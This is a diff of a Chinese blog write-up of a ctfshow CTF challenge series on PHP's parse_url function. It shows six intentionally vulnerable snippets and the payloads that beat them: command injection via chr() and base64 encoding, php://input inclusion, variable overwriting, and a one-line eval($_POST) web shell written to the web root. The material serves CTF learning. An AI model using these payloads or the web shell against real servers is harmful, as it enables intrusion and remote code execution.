@@ -64,7 +64,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#parse-url%E5%87%BD%E6%95%B0"><span class="toc-text">parse_url函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-text">第五关</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#parse-url%E5%87%BD%E6%95%B0"><span class="toc-text">parse_url函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-text">第三关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-text">第四关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-text">第五关</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-text">第六关</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -207,7 +207,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ff7d73">CTF线上赛</a>
+                <a href="/blog/tags/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #00a596">CTF线上赛</a>
             </span>
             
         </span>
@@ -215,7 +215,10 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h1><blockquote>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a target="_blank" rel="noopener" href="https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe">官方wp</a></p>
+<p>大菜鸡师傅诚不欺我，真就每道都只有两行代码（</p>
+<p>这次挑战的关键个人觉得在于需要多在本地进行测试以确定payload</p>
+<h1 id="parse-url函数"><a href="#parse-url函数" class="headerlink" title="parse_url函数"></a>parse_url函数</h1><blockquote>
 <p>解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分</p>
 </blockquote>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">parse_url</span><span class="token punctuation">(</span>参数<span class="token number">1</span><span class="token punctuation">,</span>参数<span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -225,6 +228,8 @@
 <p>参数2：非必填，是一个大写参数变量，直接获取结果集的某一部分。</p>
 </li>
 </ul>
+<span id="more"></span>
+
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://username:password@hostname:80/path?arg=value#anchor"</span><span class="token punctuation">;</span>
 <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -243,16 +248,17 @@
     <span class="token punctuation">[</span>fragment<span class="token punctuation">]</span> <span class="token operator">=></span> anchor
 <span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<span id="more"></span>
+
 
 <h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><blockquote>
-<p><code>/</code>的几种表示方法</p>
+<p>字符替换</p>
 </blockquote>
 <p>题目：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
+<p>因为parse_url()函数会把<code>/</code>后面的内容解析进path，所以这里得使用编码绕过，本人payload使用<code>chr()</code>函数进行编码</p>
 <p>payload:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>u<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token comment">//$a='tac '.chr(47).'flag_is_here.txt';system($a);</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -261,9 +267,45 @@
 <h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
 <p>php:&#x2F;&#x2F;input伪协议</p>
 </blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>题目使用<code>include</code>，那么就要想到伪协议，同时发现会拼接<code>host</code>段和<code>path</code>的内容</p>
+<p>由于我们不知道flag目录位置与名称，所以考虑使用<code>php://input</code>伪协议写入shell</p>
+<p>同时因为<code>host</code>会对冒号进行一次解析，所以需要在<code>host</code>段输入<code>php::</code></p>
+<p>payload：</p>
+<p><img src="/blog/2023/05/13/ctfshow%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98parse-url-%E4%B8%93%E5%9C%BA/image-20230517192835357.png" alt="image-20230517192835357"></p>
+<p>直接<code>cat /_f1ag_1s_h3re.txt</code></p>
 <h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
 <p>php:&#x2F;&#x2F;input伪协议</p>
 </blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">include</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>意外的能拼出来<code>php://input</code></p>
+<p><img src="/blog/2023/05/13/ctfshow%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98parse-url-%E4%B8%93%E5%9C%BA/image-20230517194402921.png" alt="image-20230517194402921"></p>
+<p>那就直接拿下了</p>
+<p><img src="/blog/2023/05/13/ctfshow%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98parse-url-%E4%B8%93%E5%9C%BA/image-20230517194808622.png" alt="image-20230517194808622"></p>
+<p>直接<code>cat /_f1a_g_1s_h3re</code></p>
+<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><blockquote>
+<p>linux下的编码绕过</p>
+</blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>因为查看根目录需要<code>/</code>，但是一旦出现<code>/</code>就会被解析进<code>path</code>，所以这里考虑用编码的方式实现绕过</p>
+<p>因为题目已经给出system函数，所以要寻找的是linux下的编码方式，那么很容易想到base64命令</p>
+<p>payload读取根目录：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>u<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//`echo 'bHMgLw==' |base64 -d`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>（执行命令需要加上反引号）</p>
+<p>然后base64编码<code>cat /1_f1ag_1s_h3re</code>获取flag</p>
 <h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
 <p>变量覆盖</p>
 </blockquote>
@@ -272,14 +314,31 @@
 <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">include</span> <span class="token variable">$$$$$$host</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-
-
+<p>一道变量覆盖，看看上面全部的解析类型后就知道怎么构造了</p>
+<p>因为<code>path</code>有<code>/</code>，<code>port</code>只能是数字，那么能用的链子就很明显了</p>
 <p>链子：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"user://pass:query@scheme?fragment#php://input"</span><span class="token punctuation">;</span>
 <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>接下来的操作就和上面一样了</p>
+<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
+<p>php短标签</p>
+</blockquote>
+<p>题目：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这次是<a href="https://c1oudfl0w0.github.io/blog/2023/03/16/PHP%E6%9D%82%E9%A1%B9/#file-put-contents-%E5%87%BD%E6%95%B0"><code>file_put_contents</code>函数</a>，那么思路应该就是写入一句话木马获取shell</p>
+<p>因为<code>path</code>中必定开头带个<code>/</code>，所以这里应该是要把整个文件路径输入进去<code>/var/www/html</code></p>
+<p>而一旦出现<code>?</code>则会被解析成<code>query</code>的内容，所以这里不能用<code>&lt;?php</code>，于是考虑短标签<code>&lt;script language=&#39;php&#39;&gt;</code></p>
+<p>payload:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>u<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//&lt;script language='php'>eval($_POST[a]);/var/www/html/1.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/13/ctfshow%E5%91%A8%E6%9C%AB%E5%A4%A7%E6%8C%91%E6%88%98parse-url-%E4%B8%93%E5%9C%BA/image-20230517235553021.png" alt="image-20230517235553021"></p>
+<p>然后经典一句话木马操作获取flag</p>
 
     </div>
     
